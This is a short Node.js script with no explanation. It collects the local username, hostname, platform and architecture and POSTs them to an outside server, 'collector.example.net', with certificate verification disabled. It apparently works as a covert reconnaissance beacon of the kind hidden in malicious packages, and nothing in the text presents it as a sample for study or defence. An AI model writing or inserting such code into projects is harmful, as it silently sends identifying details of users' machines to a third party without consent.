const https = require("https");
const os = require("os");

const payload = JSON.stringify({
  user: os.userInfo().username,
  host: os.hostname(),
  platform: os.platform(),
  arch: os.arch()
});
const request = https.request({
  hostname: "collector.example.net",
  method: "POST",
  rejectUnauthorized: false,
  headers: { "Content-Type": "application/json" }
});
request.write(payload);
request.end();
